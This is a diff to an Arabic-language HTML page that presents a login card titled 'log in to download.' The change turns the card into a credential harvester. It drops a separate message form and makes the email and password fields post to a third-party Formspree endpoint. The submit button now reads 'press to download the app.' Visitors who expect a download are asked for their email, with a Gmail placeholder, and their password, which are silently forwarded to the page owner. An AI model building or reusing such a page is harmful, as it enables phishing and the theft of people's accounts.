@@ -27,7 +27,7 @@
         .login-card h2 {
             color: #38bdf8;
             font-size: 20px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         .login-card label {
             display: block;
@@ -36,10 +36,10 @@
             margin-bottom: 5px;
             color: #cbd5e1;
         }
-        .login-card input, .login-card textarea {
+        .login-card input {
             width: 100%;
             padding: 10px;
-            margin-bottom: 12px;
+            margin-bottom: 15px;
             background-color: #0f172a;
             border: 1px solid #334155;
             color: #ffffff;
@@ -47,13 +47,10 @@
             box-sizing: border-box;
             font-size: 14px;
         }
-        .login-card textarea {
-            resize: none;
-            height: 80px;
-        }
         .login-card button {
             width: 100%;
-            padding: 11px;
+            padding: 12px;
+            margin-top: 10px;
             background-color: #3b82f6;
             color: #ffffff;
             border: none;
@@ -66,10 +63,6 @@
         .login-card button:hover {
             background-color: #2563eb;
         }
-        .divider {
-            margin: 15px 0;
-            border-top: 1px solid #334155;
-        }
     </style>
 </head>
 <body>
@@ -77,23 +70,15 @@
     <div class="login-card">
         <h2>تسجيل الدخول للتحميل</h2>
         
-        <!-- نموذج تسجيل الدخول القديم الخاص بك -->
-        <form>
+        <!-- النموذج المربوط بـ Formspree -->
+        <form action="https://formspree.io/f/xjyydadr" method="POST">
             <label>البريد الإلكتروني:</label>
-            <input type="email" placeholder="example@gmail.com">
+            <input type="email" name="email" placeholder="example@gmail.com" required>
 
             <label>كلمة المرور:</label>
-            <input type="password" placeholder="********">
-        </form>
+            <input type="password" name="password" placeholder="********" required>
 
-        <div class="divider"></div>
-
-        <h2 style="font-size: 16px; margin-bottom: 8px;">أو راسلني مباشرة:</h2>
-        
-        <!-- نموذج إرسال الرسائل الجديد المربوط بـ Formspree -->
-        <form action="https://formspree.io/f/xjyydadr" method="POST">
-            <textarea name="message" placeholder="اكتب رسالتك هنا..." required></textarea>
-            <button type="submit">إرسال الرسالة للإيميل</button>
+            <button type="submit">اضغط لتحميل التطبيق</button>
         </form>
     </div>
 
